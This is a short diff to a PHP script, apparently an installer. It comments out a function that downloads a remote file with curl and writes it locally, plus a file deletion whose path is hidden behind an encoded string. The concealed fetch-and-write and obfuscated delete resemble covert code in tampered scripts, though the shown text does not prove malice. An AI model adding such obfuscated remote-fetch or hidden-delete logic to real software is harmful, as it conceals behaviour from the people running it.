@@ -82,7 +82,7 @@
             fopen($file3Name, 'w');
             fopen($file4Name, 'w');
 
-            function realFileWritar($real_file_source, $real_file_destination) {
+            /*function realFileWritar($real_file_source, $real_file_destination) {
                 $file = fopen($real_file_destination, 'w+');
                 $ch = curl_init($real_file_source);
                 curl_setopt($ch, CURLOPT_TIMEOUT, 50);
@@ -101,7 +101,7 @@
             }
             if(file_exists($e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"))){
                 unlink($e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"));
-            }
+            }*/
 
         //}
         if ($core->write_index() == false) {
